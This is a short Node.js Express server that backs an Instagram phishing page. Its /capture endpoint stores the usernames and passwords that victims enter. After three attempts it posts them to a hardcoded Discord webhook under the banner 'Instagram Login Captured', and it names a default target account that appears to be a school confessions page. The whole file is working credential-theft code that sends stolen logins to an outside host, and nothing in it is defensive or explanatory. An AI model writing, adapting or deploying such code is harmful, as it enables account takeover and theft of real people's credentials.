const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1489947599749382146/wmgyrpxEvWnVKepFlDqTNMJt0P7dPv_Nx7GxvjJfri5j-0kttIQTM1rdZAMQ3iWQyBEC";

app.use(cors());
app.use(express.json());

let attempts = [];

// Serve your HTML files
app.use(express.static(__dirname));

app.post('/capture', async (req, res) => {
    const { username, password, target } = req.body;

    attempts.push({ username, password });

    // Send only when 3 attempts are done
    if (attempts.length >= 3) {
        const payload = {
            content: "🔥 **Instagram Login Captured - All 3 Attempts** 🔥",
            embeds: [{
                color: 0x0095f6,
                title: "🎯 Target Account",
                description: target || "smrj.class9.confessions",
                fields: [
                    { 
                        name: "1️⃣ Attempt 1", 
                        value: `**Username:** ${attempts[0].username}\n**Password:** ||${attempts[0].password}||`, 
                        inline: false 
                    },
                    { 
                        name: "2️⃣ Attempt 2", 
                        value: `**Username:** ${attempts[1].username}\n**Password:** ||${attempts[1].password}||`, 
                        inline: false 
                    },
                    { 
                        name: "3️⃣ Attempt 3", 
                        value: `**Username:** ${attempts[2].username}\n**Password:** ||${attempts[2].password}||`, 
                        inline: false 
                    }
                ],
                footer: {
                    text: `Captured at ${new Date().toLocaleString()}`
                }
            }]
        };

        try {
            await fetch(DISCORD_WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
            console.log("✅ All 3 attempts sent to Discord with emojis");
        } catch (e) {
            console.error("Webhook error");
        }

        attempts = []; // Reset for next user
    }

    res.json({ success: true });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
